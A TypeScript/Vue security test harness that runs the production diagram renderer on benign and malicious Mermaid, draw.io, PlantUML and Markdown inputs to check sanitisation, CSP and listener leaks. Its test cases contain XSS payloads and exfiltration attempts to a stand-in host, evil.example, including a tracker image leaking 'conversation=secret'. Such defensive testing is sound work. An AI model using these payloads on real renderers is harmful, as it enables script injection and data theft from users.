/**
 * 图表渲染的隔离验收入口。
 *
 * 用真实的生产渲染链（useMarkdown → useDiagramRenderer → 各渲染器 → 清理）
 * 处理恶意与正常输入，把结果挂到 #app，供 CDP 检查最终 DOM、脚本执行与网络。
 * 不连接后端、不加载私人内容、不依赖公共 CDN。
 */
import { createApp, h, ref } from 'vue'
import AssistantMessage from '@/components/agent/message/AssistantMessage.vue'
import { useDiagramRenderer } from '@/composables/useDiagramRenderer'
import { useMarkdown } from '@/composables/useMarkdown'
import { decodeCssEscapes } from '@/utils/cssSafety'

// 主题变量：渲染器按 CSS 变量取色（readThemeColors），
// 不加载令牌就只能验证"能渲染"，验证不了"跟随双主题"
import '@/styles/design-tokens.css'
import '@/styles/design-tokens-ziyan.css'

// 双主题验收：用 ?theme=theme-pop 切换，必须在渲染之前生效
const requestedTheme = new URLSearchParams(location.search).get('theme')
if (requestedTheme === 'theme-aurora' || requestedTheme === 'theme-pop') {
  document.documentElement.className = requestedTheme
}

// 受控 PlantUML 地址由构建期环境变量决定（VITE_PLANTUML_SERVER），
// 这里不写死任何主机，用来验证"配置后只联系该目标"。
const PLANTUML_SERVER = (import.meta.env.VITE_PLANTUML_SERVER as string | undefined) ?? ''

// 部署配置显式指定的受控目标：它们出现在中间 DOM 里是预期的，不算违规
const CONTROLLED_ORIGINS = [
  PLANTUML_SERVER,
  ...((import.meta.env.VITE_CSP_IMAGE_HOSTS as string | undefined) ?? '').split(','),
]
  .map((v) => {
    try {
      return new URL(v.trim()).origin
    } catch {
      return ''
    }
  })
  .filter(Boolean)

// 单独验证渲染器编排：配置了受控服务时，图片地址只能指向该服务
const { renderDiagrams } = useDiagramRenderer({ plantumlServer: PLANTUML_SERVER })
const plantumlOrchestrated = ref('')
void renderDiagrams(
  useMarkdown().render('```plantuml\n@startuml\nAlice -> Bob\n@enduml\n```'),
).then((html) => {
  plantumlOrchestrated.value = html
  // 直接把真实产物挂进 DOM，便于检查最终结构（不经过组件，避免被 Vue 清理）
  const host = document.getElementById('harness-plantuml-orchestrated')
  if (host) host.innerHTML = html
})

// 执行标记：任何 payload 若真的执行了，会在这里留下痕迹
type HarnessWindow = Window & {
  __executed?: Set<string>
  __mark?: (name: string) => void
  __cspViolations?: string[]
  __cspListenerInstalled?: boolean
  /** document 级监听器的生命周期统计，供验收脚本读取 */
  __docListeners?: {
    added: Array<{ type: string; stack: string }>
    removed: Array<{ type: string }>
    live: () => number
  }
  /** 渲染期中间 DOM 的观测结果 */
  __intermediate?: {
    foreignObjects: number
    externalRefs: string[]
    externalCss: string[]
    observerSelfTest: boolean
  }
}
const harnessWindow = window as HarnessWindow
const executed = new Set<string>()
harnessWindow.__executed = executed
harnessWindow.__mark = (name: string) => executed.add(name)

// ── 监听器生命周期观测 ─────────────────────────────────────────────
// 必须在任何图表渲染之前安装，否则测不到"渲染过程里挂了多少"。
// 只统计 document 上的监听器：mxgraph 的 keydown/keyup/mouseup 挂在那里，
// 也正是审查里泄漏的那批。
type ListenerRecord = { type: string; listener: unknown; removed: boolean; stack: string }
const docListeners: ListenerRecord[] = []
const originalAdd = EventTarget.prototype.addEventListener
const originalRemove = EventTarget.prototype.removeEventListener
EventTarget.prototype.addEventListener = function (
  this: EventTarget,
  type: string,
  listener: EventListenerOrEventListenerObject,
  options?: boolean | AddEventListenerOptions,
) {
  if (this === document) {
    docListeners.push({
      type,
      listener,
      removed: false,
      stack: new Error().stack ?? '',
    })
  }
  return originalAdd.call(this, type, listener, options)
}
EventTarget.prototype.removeEventListener = function (
  this: EventTarget,
  type: string,
  listener: EventListenerOrEventListenerObject,
  options?: boolean | EventListenerOptions,
) {
  if (this === document) {
    for (const record of docListeners) {
      if (record.type === type && record.listener === listener) record.removed = true
    }
  }
  return originalRemove.call(this, type, listener, options)
}
harnessWindow.__docListeners = {
  added: docListeners,
  removed: docListeners.filter((r) => r.removed),
  live: () => docListeners.filter((r) => !r.removed).length,
}

/**
 * 监听器观测器的正向对照：挂一个已知监听器再解绑，确认增减都被记下来。
 * 没有这一步，"监听器没有增长"既可能是真的没泄漏，也可能是探针压根没生效。
 */
function selfTestListenerProbe(): boolean {
  const before = harnessWindow.__docListeners!.live()
  const noop = () => {}
  document.addEventListener('harness-probe', noop)
  const during = harnessWindow.__docListeners!.live()
  document.removeEventListener('harness-probe', noop)
  const after = harnessWindow.__docListeners!.live()
  return during === before + 1 && after === before
}

// CSP 违规监听：不装监听器的话，"没有违规"和"没在观测"看起来一样。
// 验收脚本会同时检查 __cspListenerInstalled，把这两者区分开。
const violations: string[] = []
harnessWindow.__cspViolations = violations
harnessWindow.__cspListenerInstalled = true
document.addEventListener('securitypolicyviolation', (e) => {
  violations.push(`${e.violatedDirective} ${e.blockedURI}`)
})

// ── 渲染期中间 DOM 观测 ────────────────────────────────────────────
// 只看最终 DOM 是不够的：清理器会在最后一步把危险内容摘掉，
// 于是"渲染期确实生成了 foreignObject/外部 url()"这件事被抹平了。
// Mermaid 渲染时会先把图表插进 body 的临时节点，这段中间态必须单独观测。
type IntermediateRecord = {
  foreignObjects: number
  externalRefs: string[]
  externalCss: string[]
  /** 观测器自检：注入一个已知的中间态节点，确认它会被记录 */
  observerSelfTest: boolean
}
const intermediate: IntermediateRecord = {
  foreignObjects: 0,
  externalRefs: [],
  externalCss: [],
  observerSelfTest: false,
}
harnessWindow.__intermediate = intermediate

/**
 * 是否指向**未受控**的外部主机。
 *
 * 只关心会真的走网络的 http(s) 与协议相对地址——`about:blank` 这类
 * 内部文档地址不构成外发。部署配置显式指定的受控目标（自托管 PlantUML、
 * 受控图床）不算违规：它们是配置决定的，不是内容决定的。
 */
function isUncontrolledOrigin(value: string): boolean {
  const trimmed = value.trim()
  if (!/^(?:https?:)?\/\//i.test(trimmed)) return false
  try {
    const origin = new URL(trimmed, location.href).origin
    if (origin === location.origin) return false
    return !CONTROLLED_ORIGINS.includes(origin)
  } catch {
    return false
  }
}

const recordNode = (node: Node): void => {
  if (node.nodeType !== Node.ELEMENT_NODE) return
  const el = node as Element
  const tag = el.tagName.toLowerCase()
  if (tag === 'foreignobject') intermediate.foreignObjects += 1
  // <script src> 是应用自己的加载器，与内容无关；要盯的是内容里的资源引用
  if (tag !== 'script') {
    for (const attr of ['href', 'src', 'xlink:href']) {
      const v = el.getAttribute(attr)?.trim()
      // 只记跨源引用：同源地址不构成外发
      if (v && isUncontrolledOrigin(v)) intermediate.externalRefs.push(v)
    }
  }
  if (tag === 'style') {
    // 按 CSS 语义解码后再找 url()：`u\72l(...)` 浏览器会当 url() 处理，
    // 按字面匹配会漏掉——那正是要观测的绕过写法
    const css = decodeCssEscapes(el.textContent ?? '')
    for (const m of css.matchAll(/url\(\s*['"]?((?:https?:)?\/\/[^)'"]+)/gi)) {
      if (isUncontrolledOrigin(m[1])) intermediate.externalCss.push(m[1])
    }
  }
  for (const child of Array.from(el.children)) recordNode(child)
}

const observer = new MutationObserver((records) => {
  for (const r of records) {
    for (const node of Array.from(r.addedNodes)) recordNode(node)
  }
})
observer.observe(document.documentElement, { childList: true, subtree: true })

/**
 * 观测器自检：插一个带外部 url() 的 <style> 和一个 foreignObject，
 * 确认它们确实被记下来，然后再清空计数。
 *
 * 没有这一步，"中间 DOM 里没有外部引用"既可能是真的安全，
 * 也可能是观测器压根没工作——两者在报告里长得一模一样。
 */
function selfTestIntermediateObserver(): void {
  const host = document.createElement('div')
  host.id = 'intermediate-selftest'
  // 用 <a href> 而不是 <image href>：锚点不会去取资源，自检本身不能变成外发。
  // 观测器看的是属性值，这两者对它的意义相同。
  host.innerHTML =
    '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject></foreignObject></svg>' +
    '<a href="https://selftest.invalid/a.png">probe</a>'
  const style = document.createElement('style')
  // 选择器匹配不到任何元素，浏览器不会去取这张图
  style.textContent =
    '.intermediate-selftest-never-matches { background-image: url(https://selftest.invalid/b.png) }'
  host.appendChild(style)
  document.body.appendChild(host)

  // MutationObserver 是微任务，等一拍再读
  void Promise.resolve().then(() => {
    intermediate.observerSelfTest =
      intermediate.foreignObjects > 0 &&
      intermediate.externalRefs.includes('https://selftest.invalid/a.png') &&
      intermediate.externalCss.includes('https://selftest.invalid/b.png')

    // 清空计数，自检本身不能污染真实用例的判定
    intermediate.foreignObjects = 0
    intermediate.externalRefs = []
    intermediate.externalCss = []
    host.remove()
  })
}
selfTestIntermediateObserver()

const CASES: Array<{ id: string; label: string; content: string }> = [
  {
    id: 'normal-mermaid',
    label: '正常 Mermaid 流程图',
    content:
      '```mermaid\nflowchart TD\n  A[开始] --> B{判断}\n  B -->|是| C[执行]\n  B -->|否| D[结束]\n```',
  },
  {
    id: 'normal-mermaid-seq',
    label: '正常 Mermaid 时序图',
    content: '```mermaid\nsequenceDiagram\n  Alice->>Bob: 你好\n  Bob-->>Alice: 收到\n```',
  },
  {
    id: 'normal-drawio',
    label: '正常 draw.io 图表',
    content:
      '```drawio\n<mxGraphModel><root>' +
      '<mxCell id="0"/><mxCell id="1" parent="0"/>' +
      '<mxCell id="2" value="节点 A" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">' +
      '<mxGeometry x="40" y="40" width="100" height="40" as="geometry"/></mxCell>' +
      '<mxCell id="3" value="节点 B" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">' +
      '<mxGeometry x="200" y="40" width="100" height="40" as="geometry"/></mxCell>' +
      '<mxCell id="4" value="" style="endArrow=classic;" edge="1" parent="1" source="2" target="3">' +
      '<mxGeometry relative="1" as="geometry"/></mxCell>' +
      '</root></mxGraphModel>\n```',
  },
  {
    id: 'normal-plantuml',
    label: '正常 PlantUML（未配置自托管 -> 源码）',
    content: '```plantuml\n@startuml\nAlice -> Bob: 请求\nBob --> Alice: 响应\n@enduml\n```',
  },
  {
    id: 'evil-mermaid-script',
    label: '恶意 Mermaid：script 注入',
    content:
      '```mermaid\nflowchart TD\n  A["<img src=x onerror=__mark(\'mermaid-img-onerror\')>"] --> B\n```',
  },
  {
    id: 'evil-mermaid-click',
    label: '恶意 Mermaid：click 回调',
    content:
      '```mermaid\nflowchart TD\n  A[点我] --> B\n  click A callback "__mark(\'mermaid-click\')"\n```',
  },
  {
    id: 'evil-mermaid-link',
    label: '恶意 Mermaid：危险链接',
    content:
      '```mermaid\nflowchart TD\n  A[链接] --> B\n  click A "javascript:__mark(\'mermaid-js-link\')"\n```',
  },
  {
    id: 'evil-markdown-svg',
    label: '恶意 Markdown：内联 SVG 与事件处理器',
    content:
      "<svg onload=\"__mark('md-svg-onload')\"><script>__mark('md-script')</script></svg>\n\n" +
      '<img src=x onerror="__mark(\'md-img-onerror\')">',
  },
  {
    id: 'evil-markdown-link',
    label: '恶意 Markdown：javascript/data 链接',
    content:
      "[js](javascript:__mark('md-js-link'))\n\n[data](data:text/html;base64,PHNjcmlwdD5fX21hcmsoJ21kLWRhdGEnKTwvc2NyaXB0Pg==)\n\n" +
      "[vb](vbscript:__mark('md-vb'))",
  },
  {
    id: 'evil-drawio',
    label: '恶意 draw.io：外部图片与脚本',
    content:
      '```drawio\n<mxGraphModel><root><mxCell id="0"/><mxCell id="1" parent="0"/>' +
      '<mxCell id="2" value="&lt;img src=x onerror=__mark(\'drawio-onerror\')&gt;" ' +
      'style="text;html=1;" vertex="1" parent="1">' +
      '<mxGeometry x="20" y="20" width="160" height="40" as="geometry"/></mxCell>' +
      '</root></mxGraphModel>\n```',
  },
  {
    id: 'evil-plantuml-target',
    label: '恶意 PlantUML：试图改变请求目标',
    content:
      '```plantuml\n@startuml\nnote "https://evil.example/steal" as N\nAlice -> Bob\n@enduml\n```',
  },
  {
    id: 'external-resource',
    label: '外部资源引用：图片与远程样式',
    content: '![外链](https://evil.example/tracker.png?conversation=secret)',
  },
  // ── 审查发现的四类缺陷（回归用例）─────────────────────────────
  {
    id: 'drawio-image-request',
    label: 'draw.io：image 形状指向外部主机（不得在渲染期发请求）',
    content:
      '```drawio\n<mxGraphModel><root><mxCell id="0"/><mxCell id="1" parent="0"/>' +
      '<mxCell id="2" value="probe" ' +
      'style="shape=image;image=https://images.unsplash.com/component43-drawio?secret=sample;" ' +
      'vertex="1" parent="1">' +
      '<mxGeometry x="20" y="20" width="160" height="40" as="geometry"/></mxCell>' +
      '</root></mxGraphModel>\n```',
  },
  {
    id: 'mermaid-escaped-css',
    label: 'Mermaid：themeCSS 用 CSS 转义写 url()（不得外发）',
    content:
      '```mermaid\n' +
      '%%{init: {"themeCSS":".node rect { background-image:u\\\\72l(' +
      'https://images.unsplash.com/component43-mermaid?secret=sample) }"}}%%\n' +
      'flowchart TD\n A[开始] --> B{判断}\n B -->|是| C[执行]\n```',
  },
  {
    // 用 HTML 标签而不是外部图片：这一条要单独证明"指令被剥离"，
    // 不能靠外部地址拦截顺带通过，否则测不出剥离本身有没有生效。
    // loose + htmlLabels 下 Mermaid 会建 foreignObject 并插入真的 <b>；
    // strict 下同样内容只是一段转义过的文本。
    id: 'mermaid-loose-directive',
    label: 'Mermaid：内容试图把 securityLevel 改成 loose',
    content:
      '```mermaid\n' +
      '%%{init: {"securityLevel":"loose","htmlLabels":true}}%%\n' +
      'flowchart TD\n' +
      ' A["<b>bold-label</b>"] --> B[Y]\n```',
  },
  {
    // CSS 语义的另一种入口：Mermaid 的 `style` 语句直接写 url()。
    // 它不经过配置指令，剥离 init 拦不住；必须在交给渲染库之前拒绝。
    id: 'mermaid-style-url',
    label: 'Mermaid：style 语句用 url() 指向外部主机（不得外发）',
    content:
      '```mermaid\n' +
      'flowchart TD\n A[开始] --> B[结束]\n' +
      ' style A fill:url(https://images.unsplash.com/component43-style?secret=sample)\n```',
  },
  {
    // URL 解析器会把 `\` 当 `/`：`/\host` 与 `//host` 对浏览器是同一个目标。
    // 门禁若只匹配字面 `//`，这个形状就会在渲染期真的发出请求。
    id: 'mermaid-backslash-img',
    label: 'Mermaid：img 形状用反斜杠伪装外部地址（不得外发）',
    content:
      '```mermaid\n' +
      'flowchart TD\n' +
      ' A@{ img: "/\\images.unsplash.com/component43-backslash?secret=sample", ' +
      'label: "图", constraint: "on" } --> B[Y]\n```',
  },
  {
    // 与 draw.io 的 image 形状同类：渲染库自己在渲染期去取图，
    // 不经过任何内容指令，剥离 init/frontmatter 也拦不住。
    id: 'mermaid-image-shape',
    label: 'Mermaid：image 形状指向外部主机（不得在渲染期发请求）',
    content:
      '```mermaid\n' +
      'flowchart TD\n' +
      ' A@{ img: "https://images.unsplash.com/component43-imgshape?secret=sample", ' +
      'label: "图", constraint: "on" } --> B[Y]\n```',
  },
]

const App = {
  setup() {
    return { cases: CASES, chosen: ref('all'), plantumlOrchestrated }
  },
  render() {
    return h('div', { id: 'harness-root' }, [
      h('div', { id: 'harness-plantuml-server', 'data-value': PLANTUML_SERVER }, PLANTUML_SERVER),
      h('div', {
        id: 'harness-plantuml-orchestrated',
        innerHTML: this.plantumlOrchestrated,
      }),
      h(
        'div',
        { id: 'harness-case-list' },
        this.cases.map((c) =>
          h('div', { class: 'harness-case', 'data-case': c.id }, [
            h('h3', c.label),
            h('div', { class: 'harness-output' }, [
              // 每个用例独立挂载，避免相互影响
              h(AssistantMessage, { content: c.content }),
            ]),
          ]),
        ),
      ),
    ])
  },
}

// 页面级监听器基线：必须在**任何图表渲染之前**取。
// 若在用例都跑完之后才取，泄漏的监听器会被算进基线里，判据就永远成立。
const pageListenerBaseline = harnessWindow.__docListeners?.live() ?? 0

createApp(App).mount('#app')

// ── 生命周期观测：渲染 → 更新 → 卸载 ──────────────────────────────
// 单独挂一个组件，记录每一步之后 document 上还挂着多少监听器。
// 判据是"每一步都不比上一步多"——累积就说明图实例没被销毁。
type LifecycleWindow = Window & {
  __lifecycle?: {
    steps: Array<{ name: string; live: number }>
    /** 挂载探针组件之前的存活监听器数（页面自身 + 已完成用例） */
    baseline: number
    /** 任何用例渲染之前的存活数：用例泄漏会在这里暴露出来 */
    pageBaseline: number
    /** 生命周期结束后相对 pageBaseline 的增量 */
    leakAfterAll: number
    /** 监听器探针自检结果 */
    probeSelfTest: boolean
    done: boolean
  }
}
const lifecycleWindow = window as LifecycleWindow
const lifecycle = {
  steps: [] as Array<{ name: string; live: number }>,
  baseline: 0,
  pageBaseline: pageListenerBaseline,
  leakAfterAll: 0,
  /** 监听器探针自检：注入并解绑一个监听器，确认增减都被记录 */
  probeSelfTest: false,
  done: false,
}
lifecycleWindow.__lifecycle = lifecycle

const drawioContent = (marker: string) =>
  '```drawio\n<mxGraphModel><root><mxCell id="0"/><mxCell id="1" parent="0"/>' +
  `<mxCell id="2" value="${marker}" style="rounded=0;" vertex="1" parent="1">` +
  '<mxGeometry x="10" y="10" width="80" height="30" as="geometry"/></mxCell>' +
  '</root></mxGraphModel>\n```'

async function runLifecycle(): Promise<void> {
  // 先证明探针本身有效，再拿它的读数下结论
  lifecycle.probeSelfTest = selfTestListenerProbe()

  const host = document.createElement('div')
  host.id = 'lifecycle-host'
  document.getElementById('app')?.appendChild(host)

  // 基线要在挂载之前取：此时页面上已有的监听器属于别的东西，
  // 判据只关心"这个组件自己有没有留下东西"，不该被基线拉高。
  lifecycle.baseline = harnessWindow.__docListeners?.live() ?? 0

  const probe = createApp({
    setup() {
      const content = ref(drawioContent('render-1'))
      return { content }
    },
    render() {
      return h(AssistantMessage, { content: this.content })
    },
  })
  const vm = probe.mount(host) as unknown as { content: string }

  const waitFor = async (predicate: () => boolean, timeoutMs = 15000) => {
    const deadline = Date.now() + timeoutMs
    while (Date.now() < deadline) {
      if (predicate()) return true
      await new Promise((r) => setTimeout(r, 50))
    }
    return false
  }
  const record = (name: string) =>
    lifecycle.steps.push({ name, live: harnessWindow.__docListeners?.live() ?? -1 })

  await waitFor(() => !!host.querySelector('.diagram-preview svg'))
  record('after-render')

  // 内容更新：同一组件重新渲染，旧图实例必须已释放
  vm.content = drawioContent('render-2')
  await waitFor(() => (host.textContent ?? '').includes('render-2'))
  record('after-update')

  vm.content = drawioContent('render-3')
  await waitFor(() => (host.textContent ?? '').includes('render-3'))
  record('after-update-2')

  probe.unmount()
  host.remove()
  await new Promise((r) => setTimeout(r, 200))
  record('after-unmount')

  // 相对"任何用例渲染之前"的增量：这才是整页有没有泄漏的判据。
  // 用挂载前那一刻的基线会把已完成用例泄漏的监听器一并算进去。
  lifecycle.leakAfterAll = (harnessWindow.__docListeners?.live() ?? 0) - pageListenerBaseline

  lifecycle.done = true
}

void runLifecycle()

/**
 * 正向对照：主动制造三次应被拦截的行为，证明策略真的在浏览器里执行。
 * 没有这一步，"零违规"也可能只是没在观测。三次探测都不应产生真实外发：
 * CSP 在发请求之前就拦下它们。
 */
function probeCspEnforcement(): void {
  const remote = document.createElement('script')
  remote.src = 'https://csp-probe.invalid/probe.js'
  document.head.appendChild(remote)
  remote.remove()

  const inline = document.createElement('script')
  inline.textContent = "__mark('csp-inline-script')"
  document.head.appendChild(inline)
  inline.remove()

  // connect-src 'self' 应当拦下这条；被拦下就不会真的发出去
  void fetch('https://csp-probe.invalid/beacon').catch(() => {})
}

probeCspEnforcement()
